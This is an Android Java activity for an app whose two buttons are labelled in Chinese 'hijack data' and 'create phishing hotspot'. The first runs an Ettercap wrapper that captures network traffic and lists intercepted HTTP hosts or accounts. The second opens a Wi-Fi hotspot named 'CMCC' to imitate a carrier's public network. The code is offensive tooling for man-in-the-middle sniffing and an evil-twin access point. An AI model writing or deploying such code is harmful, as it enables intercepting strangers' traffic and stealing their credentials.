package me.liet.agnes;



import java.util.ArrayList;
import java.util.HashMap;

import me.liet.agnes.R;

import me.liet.agens.tools.Ettercap;
import me.liet.agens.tools.Ettercap.OnAccountListener;
import me.liet.agnes.core.System;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.View;
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.SimpleAdapter;

public class MainActivity extends Activity {

	public static final String TAG = "MainActivity";
	private static final int COMPLETED = 0; 	
	private Button mBtn1, mBtn2;
	public ListView listView; 
	public ArrayList<HashMap<String, Object>> listItem;
	public SimpleAdapter listItemAdapter;
	
	private Context mContext = null;

	 private Handler handler = new Handler() {  
	        @Override  
	        public void handleMessage(Message msg) {  
	            if (msg.what == COMPLETED) { 
		        	HashMap<String, Object> map = new HashMap<String, Object>();  
		        	map.put("httpId", "HTTP");  
		        	map.put("httpHost", msg.obj);  
		        	listItem.add(map);
		        	listItemAdapter.notifyDataSetChanged(); 
	            }  
	        }  
	    };  
	
	    
	    
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		mContext = this;
		try {
			System.init(this);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		setContentView(R.layout.activity_main);
		//Log.v(TAG,getApplicationContext().getFilesDir().getAbsolutePath());
		mBtn1 = (Button)findViewById(R.id.button1);
		mBtn2 = (Button)findViewById(R.id.button2);
		mBtn1.setText("劫持数据");
		mBtn2.setText("创建钓鱼热点");
		ListView httpList =  (ListView)findViewById(R.id.httpList);
		
		listItem = new ArrayList<HashMap<String, Object>>();  
		listItemAdapter = new SimpleAdapter(this, listItem, R.layout.list,   
		new String[]{"httpId", "httpHost"},  
		new int[]{R.id.httpId, R.id.httpHost});  
		httpList.setAdapter(listItemAdapter);  
		

		mBtn1.setOnClickListener(new Button.OnClickListener() {
			
			@Override
			public void onClick(View v) {

		        Ettercap mEttercap  = new Ettercap(mContext);
			    mEttercap.dissect(new OnAccountListener(){

					@Override
					public void onAccount(String host) {
						Log.v("host",host);
						 Message msg = new Message();  
				         msg.what = COMPLETED;
				         msg.obj = host;
				         handler.sendMessage(msg);
					}
				}).start();
			}
		});		
		mBtn2.setOnClickListener(new Button.OnClickListener() {
			
			@Override
			public void onClick(View v) {
				WifiApAdmin wifiAp = new WifiApAdmin(mContext);
				wifiAp.startWifiAp("CMCC", "hhhhhh123");
			}
		});
		
	}
	
	
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	 @Override
	    public void onResume() {
	        super.onResume();
	        
	        Log.d("Rssi", "Registered");
	    }

	    @Override
	    public void onPause() {
	        super.onPause();
	        
	        Log.d("Rssi", "Unregistered");
	    }
		
 
 
	    


}

